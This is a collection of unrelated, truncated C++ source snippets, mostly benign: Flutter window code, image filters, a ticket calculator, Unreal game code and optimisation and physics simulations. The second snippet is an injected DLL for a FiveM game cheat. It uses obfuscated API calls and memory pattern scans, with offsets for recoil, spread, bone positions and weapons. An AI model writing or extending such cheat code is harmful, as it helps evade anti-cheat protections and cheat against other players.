    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "//\n// Created by MasaHiroSaber on 2023/11/29.\n//\n\n#include \"CImageProcessingEx.h\"\n#include \"CalFunction.h\"\n#include \"PCAMatrix.h\"\n\nusing namespace std;\ndouble separability;\n\nCImageProcessingEx::CImageProcessingEx(void)\n{}\n\nCImageProcessingEx::~CImageProcessingEx(void)\n{}\n\n//\u76f4\u65b9\u56fe\u5747\u8861\u5316\nBOOL CImageProcessingEx::hisTeg(CImageDataset &imgIn, CImageDataset &imgOut)\n{\n    const int LEVEL = 256;\n    int k, row, col;\n    double hist[LEVEL], sk[LEVEL];\n\n    if (imgIn.empty())\n    {\n        return FALSE;\n    }\n\n    if (FALSE == imgIn.duplicate(imgOut))\n    {\n        return FALSE;\n    }\n    double *data = imgOut.m_data;\n\n    for (k = 0; k < LEVEL; k++)\n    {\n        hist[k] = 0;\n    }\n    for (row = 0; row < imgIn.m_ysize; row++)\n    {\n        for (col = 0; col < imgIn.m_xsize; col++)\n        {\n            hist[UINT8(data[row * imgIn.m_xsize + col])]++;\n        }\n    }\n\n    sk[0] = hist[0] / (imgIn.m_ysize * imgIn.m_xsize);\n    for (k = 1; k < LEVEL - 1; k++)\n    {\n        sk[k] = sk[k - 1] + hist[k] / (imgIn.m_ysize * imgIn.m_xsize);\n    }\n    sk[255] = 1;\n\n    for (row = 0; row < imgOut.m_ysize; row++)\n    {\n        for (col = 0; col < imgOut.m_xsize; col++)\n        {\n            for (k = 0; k < LEVEL; k++)\n            {\n                if (data[row * imgOut.m_xsize + col] == k)\n                {\n                    data[row * imgOut.m_xsize + col] = int((LEVEL - 1) * sk[k] + 0.5);//\u7070\u5ea6\u53d8\u6362\n                    k = LEVEL;\n                }\n            }\n        }\n    }\n    return TRUE;\n}\n\n//\u76f4\u65b9\u56fe\u5339\u914d\nBOOL CImageProcessingEx::hisMatch(CImageDataset &imgIn, CImageDataset &imgReference, CImageDataset &imgOut)\n{\n    if (imgIn.empty() || imgReference.empty()) return FALSE;\n\n    const int LEVEL = 256;\n    vector<double> imgInHist(LEVEL), imgRefHist(LEVEL);\n    vector<double> imgInCumHist(LEVEL), imgRefCumHist(LEVEL);\n\n    if (FALSE == imgOut.create(imgIn.m_xsize, imgIn.m_ysize, imgIn.m_rastercount))\n        return FALSE;\n\n    double *imgOutput = imgOut.m_data;\n    const double *imgInput = imgIn.m_data;\n\n    int area = imgIn.m_xsize * imgIn.m_ysize;\n\n    for (int band = 0; band < imgIn.m_rastercount; band++)\n    {\n        CalFunction::calHist(imgIn, band, imgInHist);\n        CalFunction::calHist(imgReference, band, imgRefHist);\n\n        CalFunction::calCumHist(imgInHist, imgInCumHist, area, LEVEL);\n        CalFunction::calCumHist(imgRefHist, imgRefCumHist, area, LEVEL);\n\n        vector<double> temp(LEVEL);\n        vector<double>::iterator minValue;\n        int record[LEVEL];\n\n        int i, j;\n        for (i = 0; i < LEVEL; i++)\n        {\n            for (j = 0; j < LEVEL; j++)\n            {\n                temp[j] = abs(imgInCumHist[i] - imgRefCumHist[j]);\n            }\n            //#include <algorithm> \u6765\u4f7f\u7528 min_element\n            minValue = min_element(temp.begin(), temp.end());\n            record[i] = distance(temp.begin(), minValue);\n        }\n\n\n        for (int row = 0; row < imgIn.m_ysize; row++)\n        {\n            for (int col = 0; col < imgIn.m_xsize; col++)\n            {\n                int index = band * imgIn.m_ysize * imgIn.m_xsize + row * imgIn.m_xsize + col;\n                imgOutput[index] = record[int(imgInput[index])];\n            }\n        }\n    }\n    return TRUE;\n}\n\n\nBOOL CImageProcessingEx::medFilter(CImageDataset &imgIn, CImageDataset &imgOut, int kerLen)\n{\n    if (imgIn.empty()) return FALSE;\n\n    if (FALSE == imgOut.create(imgIn.m_xsize, imgIn.m_ysize, imgIn.m_rastercount))\n        return FALSE;\n\n    int count = 0;\n    int kerArea = kerLen * kerLen;\n    int border = kerLen / 2;\n\n    double *imgOutput = imgOut.m_data;\n    const double *imgInput = imgIn.m_data;\n\n    CImageDataset Temp;\n    CalFunction::zeroFill(imgIn, Temp, kerLen);\n//    Temp.create(imgIn.m_xsize + 2 * border, imgIn.m_ysize + 2 * border, imgIn.m_rastercount);\n    vector<double> kerValue(kerArea);\n\n    //0\u586b\u5145\n    for (int band = 0; band < imgIn.m_rastercount; band++)\n    {\n        for (int row = border; row < Temp.m_ysize - border; row++)\n        {\n            for (int col = border; col < Temp.m_xsize - border; col++)\n            {\n                int indexTemp = band * Temp.m_ysize * Temp.m_xsize + row * Temp.m_xsize + col;\n                int indexIn = band * imgIn.m_ysize * imgIn.m_xsize + (row - border) * imgIn.m_xsize + (col - border);\n\n                Temp.m_data[indexTemp] = imgInput[indexIn];\n            }\n        }\n    }\n\n    for (int band = 0; band < Temp.m_rastercount; band++)\n    {\n        for (int row = border; row < Temp.m_ysize - border; row++)\n        {\n            for (int col = border; col < Temp.m_xsize - border; col++)\n            {\n                for (int kerRow = row - border; kerRow <= row + border; kerRow++)\n                {\n                    for (int kerCol = col - border; kerCol <= col + border; kerCol++)\n                    {\n                        int index = band * Temp.m_ysize * Temp.m_xsize + kerRow * Temp.m_xsize + kerCol;\n                        kerValue[count++] = Temp.m_data[index];\n                    }\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example_pie_chart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<iomanip>\r\nusing namespace std;\r\nint main()\r\n{\r\n  string name;\r\n  int no_adult,no_child;\r\n  float adult_price,child_price,pert_gross,total_tickets,gross_amt,amt_donate,net_sale;\r\n  cout<<\"enter the movie name=\";\r\n  cin>>name;\r\n  \r\n  cout<<\"enter the adult numbers=\";\r\n  cin>>no_adult;\r\n  \r\n  cout<<\"enter the child numbers=\";\r\n  cin>>no_child;\r\n  \r\n  cout<<\"enter the adult ticket price=\";\r\n  cin>>adult_price;\r\n  \r\n  cout<<\"enter the child ticket price=\";\r\n  cin>>child_price;\r\n  \r\n  cout<<\"enter the percentage gross amount=\";\r\n  cin>>pert_gross;\r\n  \r\n  total_tickets=no_adult+no_child;\r\n  \r\n  cout<<\"the total number of tickets=\"<<total_tickets<<endl;\r\n  \r\n  gross_amt=(adult_price*no_adult)+(child_price*no_child);\r\n  \r\n  cout<<\"the gross amount =\"<<gross_amt<<endl;\r\n  \r\n  amt_donate=(gross_amt*pert_gross/100);\r\n  cout<<\" the amount donated=\"<<amt_donate<<endl;\r\n\r\n  \r\n  net_sale=gross_amt-amt_donate;\r\n  cout<<\"the net sale of the ticket=\"<<net_sale<<endl;\r\n  \r\n  cout<<setfill('.')<<setw(35)<<left<<\"name\"<<\" \"<<right<<name<<endl;\r\n  cout<<setfill('.')<<setw(35)<<left<<\"number of tickets\"<<\" \"<<right<<total_tickets<<setw(10)<<endl;\r\n  cout<<setfill('.')<<setw(35)<<left<<\"gross amount\"<<\" \"<<\" $\"<<right<<gross_amt<<endl;\r\n  cout<<setfill('.')<<setw(35)<<left<<\"percentage of gross amount donated\"<<\" \"<<right<<pert_gross<<\" %\"<<endl;\r\n  cout<<setfill('.')<<setw(35)<<left<<\"amount donated\"<<\" \"<<\" $\"<<right<<amt_donate<<right<<endl;\r\n  cout<<setfill('.')<<setw(35)<<left<<\"net_sale\"<<\" \"<<\" $\"<<right<<net_sale;\r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n    \r\n   \t\r\n}\r\n",
    "// Copyright INVI1998\n\n\n#include \"Character/AuraEnemy.h\"\n\n#include \"AbilitySystem/AuraAbilitySystemComponent.h\"\n#include \"AbilitySystem/AuraAttributeSet.h\"\n#include \"Arcane/Arcane.h\"\n\nAAuraEnemy::AAuraEnemy()\n{\n\tGetMesh()->SetCollisionResponseToChannel(ECC_Visibility, ECR_Block);\t// \u8bbe\u7f6e\u78b0\u649e\u54cd\u5e94\n\n\tAbilitySystemComponent = CreateDefaultSubobject<UAuraAbilitySystemComponent>(TEXT(\"AbilitySystemComponent\"));\t// \u521b\u5efa\u80fd\u529b\u7cfb\u7edf\u7ec4\u4ef6\n\tAbilitySystemComponent->SetIsReplicated(true);\t// \u8bbe\u7f6e\u590d\u5236\n\tAbilitySystemComponent->SetReplicationMode(EGameplayEffectReplicationMode::Minimal);\t// \u8bbe\u7f6e\u590d\u5236\u6a21\u5f0f\uff0c\u5bf9\u4e8eAI\u6765\u8bf4\uff0c\u53ea\u9700\u8981\u6700\u5c0f\u7684\u590d\u5236\n\n\tAttributeSet = CreateDefaultSubobject<UAuraAttributeSet>(TEXT(\"AttributeSet\"));\t// \u521b\u5efa\u5c5e\u6027\u96c6\n}\n\nvoid AAuraEnemy::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n\tAbilitySystemComponent->InitAbilityActorInfo(this, this);\t// \u521d\u59cb\u5316\u80fd\u529b\u7cfb\u7edf\u7ec4\u4ef6\uff0c\u8bbe\u7f6e\u62e5\u6709\u8005\u548c\u6240\u6709\u8005\n}\n\nvoid AAuraEnemy::HighlightActor()\n{\n\t// \u901a\u8fc7\u8bbe\u7f6e\u540e\u5904\u7406\u6750\u8d28\u6765\u9ad8\u4eae\uff0c\u540e\u5904\u7406\u6750\u8d28\u4e3b\u8981\u901a\u8fc7\u6e32\u67d3\u81ea\u5b9a\u4e49\u6df1\u5ea6\u6765\u5b9e\u73b0\n\n\tGetMesh()->SetRenderCustomDepth(true);\t// \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6df1\u5ea6\u6e32\u67d3\n\tGetMesh()->CustomDepthStencilValue = CUSTOM_DEPTH_STENCIL_RED;\t// \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6df1\u5ea6\u503c\n\n\tif (Weapon)\n\t{\n\t\tWeapon->SetRenderCustomDepth(true);\t// \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6df1\u5ea6\u6e32\u67d3\n\t\tWeapon->SetCustomDepthStencilValue(CUSTOM_DEPTH_STENCIL_RED);\t// \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6df1\u5ea6\u503c\n\t}\n\n}\n\nvoid AAuraEnemy::UnHighlightActor()\n{\n\tGetMesh()->SetRenderCustomDepth(false);\t// \u53d6\u6d88\u81ea\u5b9a\u4e49\u6df1\u5ea6\u6e32\u67d3\n\tif (Weapon)\n\t{\n\t\tWeapon->SetRenderCustomDepth(false);\t// \u53d6\u6d88\u81ea\u5b9a\u4e49\u6df1\u5ea6\u6e32\u67d3\n\t}\n}\n",
    "/**\n *\n * Fitness-based Conditional Real-Valued Gene-pool Optimal Mixing Evolutionary Algorithm\n *\n * Copyright (c) 2024 by Georgios Andreadis, Tanja Alderliesten, Peter A.N. Bosman, Anton Bouter, and Chantal Olieman\n * This code is licensed under CC BY-NC-ND 4.0. A copy of the license is included in the LICENSE file.\n *\n * If you use this software for any purpose, please cite the most recent pre-print titled:\n * \"Fitness-based Linkage Learning and Maximum-Clique Conditional Linkage Modelling for Gray-box Optimization\n *  with RV-GOMEA\", by Georgios Andreadis, Tanja Alderliesten, and Peter A.N. Bosman. 2024.\n *\n * IN NO EVENT WILL THE AUTHOR OF THIS SOFTWARE BE LIABLE TO YOU FOR ANY\n * DAMAGES, INCLUDING BUT NOT LIMITED TO LOST PROFITS, LOST SAVINGS, OR OTHER\n * INCIDENTIAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR THE INABILITY\n * TO USE SUCH PROGRAM, EVEN IF THE AUTHOR HAS BEEN ADVISED OF THE POSSIBILITY\n * OF SUCH DAMAGES, OR FOR ANY CLAIM BY ANY OTHER PARTY. THE AUTHOR MAKES NO\n * REPRESENTATIONS OR WARRANTIES ABOUT THE SUITABILITY OF THE SOFTWARE, EITHER\n * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT. THE\n * AUTHOR SHALL NOT BE LIABLE FOR ANY DAMAGES SUFFERED BY ANYONE AS A RESULT OF\n * USING, MODIFYING OR DISTRIBUTING THIS SOFTWARE OR ITS DERIVATIVES.\n *\n */\n\n #include \"solution.h\"\n\nsolution_t::solution_t(int number_of_variables) {\n    this->number_of_variables = number_of_variables;\n    variables = vec(number_of_variables, fill::none);\n    objective_value = 1e308;\n    constraint_value = 1e308;\n}\n\nsolution_t::solution_t(vec &variables) {\n    this->variables = variables;\n    this->number_of_variables = variables.n_elem;\n    objective_value = 1e308;\n    constraint_value = 1e308;\n}\n\nsolution_t::~solution_t() {\n}\n\nsolution_t::solution_t(const solution_t &sol) {\n    number_of_variables = sol.number_of_variables;\n    variables = sol.variables;\n    objective_value = sol.objective_value;\n    constraint_value = sol.constraint_value;\n    NIS = sol.NIS;\n}\n\nvoid solution_t::print() {\n    for (int i = 0; i < number_of_variables; i++)\n        printf(\"%6.3e \", variables[i]);\n    printf(\"\\n\");\n}\n\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <ctime>\n#include <numeric>\n#include <random>\n#include <fstream>\n#include <time.h>\n\n\n// container's structure\n\nstruct _TEMPERING_CONTAINER\n{\n    std::vector<double> CAPACITY;\n    std::vector<double> ENERGY;\n    std::vector<std::vector<int>> SUCCESSFUL_COPIES;\n    std::vector<float> TEMPERATURES;\n};\n\nclass _SPIN_SYSTEM\n{\nprivate:\n    int SIZE, NUM_OF_COPIES, REPEAT, NUM_OF_STEPS, ACCURACY;\n    float T_MIN, T_MAX;\n    std::vector<std::vector<int>> CAPACITY;\n    std::vector<std::vector<int>> ENERGY;\npublic:\n    //  Class constructor\n    _SPIN_SYSTEM(int _SIZE, int _NUM_OF_COPIES, int _REPEAT, int _NUM_OF_STEPS, int _ACCURACY, float _T_MIN, float _T_MAX)\n        : SIZE(_SIZE),\n        NUM_OF_COPIES(_NUM_OF_COPIES),\n        REPEAT(_REPEAT),\n        NUM_OF_STEPS(_NUM_OF_STEPS),\n        ACCURACY(_ACCURACY),\n        T_MIN(_T_MIN),\n        T_MAX(_T_MAX) {}\n\n    // functions of class\n\n    // generate the random state of spins\n    std::vector<std::vector<int>> random_states()\n    {\n        std::vector<int> ones = { -1, 1 };\n        std::vector<std::vector<int>> states(NUM_OF_COPIES, std::vector<int>(SIZE * SIZE));\n\n        srand(time(0));\n\n        for (int i = 0; i < NUM_OF_COPIES; ++i)\n        {\n            for (int j = 0; j < SIZE * SIZE; ++j)\n                states[i][j] = ones[rand() % 2];\n        }\n\n        return states;\n    };\n\n    // generate the vector with temperatures \n    std::vector<float> temperatures_generate()\n    {\n        std::vector<float> temperatures(NUM_OF_COPIES);\n        float delta_T = (T_MAX - T_MIN) / (NUM_OF_COPIES - 1);\n        float plus_delta_T = T_MIN;\n\n        for (int i = 0; i < NUM_OF_COPIES; ++i)\n        {\n\n            temperatures[i] = plus_delta_T;\n            plus_delta_T += delta_T;\n        }\n        \n        return temperatures;\n    };\n\n    // Make probability of exchange to 20%\n    float approx(float T1, float T2, double E1, double E2, float alpha)\n    {\n        return ((T2+alpha-T1)/(T2-T1))*(E2-E1)+E1;\n    };\n\n    std::vector<float> temperature_normalize(std::vector<float> temperatures, std::vector<double> energies, float alpha, int tn_steps)\n    {\n        for (int i = 1; i < NUM_OF_COPIES; i++)\n        {\n            for (int j = 1; j < NUM_OF_COPIES; j++)\n            {\n                if (i != j)\n                {\n                    double p = std::pow(2.718282, (((double)energies[i] - 